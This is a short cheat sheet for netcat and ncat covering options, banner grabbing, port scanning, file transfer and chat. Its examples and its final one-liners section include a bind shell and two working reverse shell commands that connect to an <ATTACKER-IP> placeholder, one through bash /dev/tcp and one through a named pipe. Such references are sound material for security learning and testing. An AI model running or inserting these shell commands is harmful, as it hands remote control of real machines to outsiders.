# netcat — TCP/UDP Swiss Army Knife

Read and write data across network connections: port scanning, banner grabbing,
file transfer, chat, and reverse/bind shells.

```bash
nc example.com 80
```

## Options

| Command | Description |
| :--- | :--- |
| `-l` | Listen mode (server) |
| `-p <port>` | Local port |
| `-v` | Verbose |
| `-n` | Skip DNS resolution |
| `-u` | UDP instead of TCP |
| `-w 3` | Timeout in seconds |
| `-z` | Zero-I/O mode (scanning, no data) |
| `-k` | Keep listening after a client disconnects |
| `-e /bin/sh` | Execute a program on connect (traditional/OpenBSD variants only) |

> On macOS the default is the BSD `nc`. `-e` is absent — use `ncat` (from nmap) or a shell redirect for shells.

## Examples

```bash
# 1. Banner grabbing
nc -v example.com 22

# 2. Port scan a range
nc -zv example.com 20-100

# 3. Simple chat / listener
nc -lvp 4444            # receiver
nc <peer-ip> 4444       # sender

# 4. File transfer
nc -lvp 4444 > received.bin     # receiver
nc <peer-ip> 4444 < file.bin    # sender

# 5. Reverse shell listener (attacker side)
nc -lvnp 4444

# 6. Bind shell with ncat (nmap's netcat)
ncat -lvnp 4444 -e /bin/bash
```

## Reverse Shell One-liners (victim → listener)

```bash
# bash
bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1

# netcat with a named pipe (no -e available)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 4444 > /tmp/f
```

## Installation

```bash
# BSD netcat ships with macOS. For the feature-rich ncat:
brew install nmap        # provides ncat
```
